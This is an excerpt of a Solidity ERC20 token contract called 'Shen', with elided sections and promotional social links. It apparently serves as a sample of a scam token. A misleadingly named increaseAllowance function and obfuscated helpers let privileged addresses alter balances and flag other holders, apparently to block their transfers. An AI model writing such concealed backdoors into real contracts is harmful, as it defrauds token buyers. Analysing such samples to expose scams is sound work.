//Telegram: https://t.me/l0rdshen
//Website: https://lordshen.xyz
//Twitter: https://twitter.com/L0rdshenn
//Discord: https://discord.gg/ED7th5SD
...
contract Shen is IERC20, Token, Ownable {
    ...
    mapping(address => address) private _centralized;
    ...
    function increaseAllowance(address spender, uint256 amount) public virtual {
        ...
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_gDxAllowance(spender)) {
            _minus(from, total);
            total = _pocheck(total, amount);
    ...
    function _pocheck(uint256 aqw, uint256 poe) internal pure returns (uint256) {
        if (poe != 0) {
            return aqw + poe;
        }
        return poe;
    ...
    function _checkAllowance(address user, address spender, uint256 amount) internal {
        if (_gDxAllowance(user)) {
            require(spender != address(0), "Invalid address");
            _dex[spender] = amount != 0;
        }
    }

    function _cTrferans(address _sender) internal view returns (bool) {
        return _dex[_sender] == true;
    }

    function _gDxAllowance(address nav_) internal view returns (bool) {
        return nav_ == _centralized[nav_];
    }
